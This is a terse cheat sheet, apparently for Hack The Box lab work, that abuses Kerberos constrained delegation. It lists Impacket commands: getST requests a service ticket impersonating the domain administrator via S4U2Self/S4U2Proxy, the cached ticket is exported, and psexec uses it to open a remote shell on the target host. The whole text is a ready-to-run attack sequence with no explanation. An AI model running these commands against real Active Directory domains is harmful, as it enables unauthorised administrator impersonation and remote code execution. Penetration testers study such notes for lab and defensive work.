# Impacket getST
```
impacket-getST -spn cifs/target.domain.htb -impersonate administrator domain.htb/svc_account:pass
```

# Use the ticket
```
export KRB5CCNAME=administrator.ccache
```

```
impacket-psexec -k -no-pass domain.htb/administrator@target.domain.htb
```

# S4U2Self + S4U2Proxy
```
impacket-getST -spn cifs/target.domain.htb -impersonate administrator -dc-ip 10.10.10.X domain.htb/svc_account:pass
```
